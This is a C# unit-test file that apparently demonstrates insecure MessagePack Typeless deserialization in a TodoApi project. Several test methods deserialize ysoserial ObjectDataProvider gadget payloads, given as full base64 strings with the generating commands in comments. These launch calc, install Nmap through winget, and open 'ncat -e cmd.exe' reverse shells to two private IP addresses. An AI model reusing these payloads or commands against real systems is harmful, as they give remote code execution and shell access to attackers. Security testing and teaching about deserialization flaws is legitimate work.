using MessagePack.Resolvers;
using MessagePack;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using System;
using System.IO;
using System.Collections.Generic;

namespace TodoApi.Tests
{
    [TestClass]
    public class SerializationTests
    {
        public TestContext TestContext { get; set; }

        [TestMethod]
        public void LaunchCalc()
        {
            // ysoserial -f MessagePackTypeless -g ObjectDataProvider -o base64 -c "calc"
            string maliciousString = "yAE4ZNmAU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzWCqk1ldGhvZE5hbWWlU3RhcnSuT2JqZWN0SW5zdGFuY2XHkmTZZVN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5galTdGFydEluZm+CqEZpbGVOYW1lo2NtZKlBcmd1bWVudHOnL2MgY2FsYw==";

            Deserialize(maliciousString);
        }

        [TestMethod]
        public void InstallNcat()
        {
            // ysoserial -f MessagePackTypeless -g ObjectDataProvider  -o base64 -c "winget install Insecure.Nmap"
            string maliciousString = "yAFQZNmAU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzWCqk1ldGhvZE5hbWWlU3RhcnSuT2JqZWN0SW5zdGFuY2XHqmTZZVN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5galTdGFydEluZm+CqEZpbGVOYW1lo2NtZKlBcmd1bWVudHO/L2Mgd2luZ2V0IGluc3RhbGwgSW5zZWN1cmUuTm1hcA==";

            Deserialize(maliciousString);
        }

        [TestMethod]
        public void OpenNcat()
        {
            // ysoserial -f MessagePackTypeless -g ObjectDataProvider  -o base64 -c "ncat -e cmd.exe -nv 172.30.181.236 2222"

            string maliciousString = "yAFcZNmAU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzWCqk1ldGhvZE5hbWWlU3RhcnSuT2JqZWN0SW5zdGFuY2XHtmTZZVN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5galTdGFydEluZm+CqEZpbGVOYW1lo2NtZKlBcmd1bWVudHPZKi9jIG5jYXQgLWUgY21kLmV4ZSAtbnYgMTcyLjMwLjE4MS4yMzYgMjIyMg==";
            Deserialize(maliciousString);

            // ysoserial -f MessagePackTypeless -g ObjectDataProvider  -o base64 -c "ncat -e cmd.exe -nv 172.31.71.78 2222"

            maliciousString = "yAFaZNmAU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzWCqk1ldGhvZE5hbWWlU3RhcnSuT2JqZWN0SW5zdGFuY2XHtGTZZVN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5galTdGFydEluZm+CqEZpbGVOYW1lo2NtZKlBcmd1bWVudHPZKC9jIG5jYXQgLWUgY21kLmV4ZSAtbnYgMTcyLjMxLjcxLjc4IDIyMjI=";
            Deserialize(maliciousString);
        }

        [TestMethod]
        public void SerializeDictionary()
        {
           Dictionary<int, string> personList = new Dictionary<int, string>();

            // Add rows to the table
            personList.Add(1, "John");
            personList.Add(2, "Jane");
            personList.Add(3, "Jack");

            // Serialize the DataTable to a memory stream
            string binDictionary = SerializeObject((object)personList);

            this.TestContext.WriteLine(binDictionary);
        }

        private static string SerializeObject(object obj)
        {
            using (var stream = new MemoryStream())
            {
                MessagePackSerializerOptions options =
                TypelessContractlessStandardResolver.Options
                // .WithAllowAssemblyVersionMismatch(true)
                .WithSecurity(MessagePackSecurity.TrustedData);

                MessagePackSerializer.Serialize(stream, obj, options);
                return Convert.ToBase64String(stream.ToArray());
            }
        }

        private void Deserialize(string maliciousString)
        {
            byte[] buffer = Convert.FromBase64String(maliciousString);

            MessagePackSerializerOptions options =
                TypelessContractlessStandardResolver.Options
                // .WithAllowAssemblyVersionMismatch(true)
                .WithSecurity(MessagePackSecurity.UntrustedData);

            MessagePackSerializer.Typeless.Deserialize(buffer, options);
        }    
    }
}
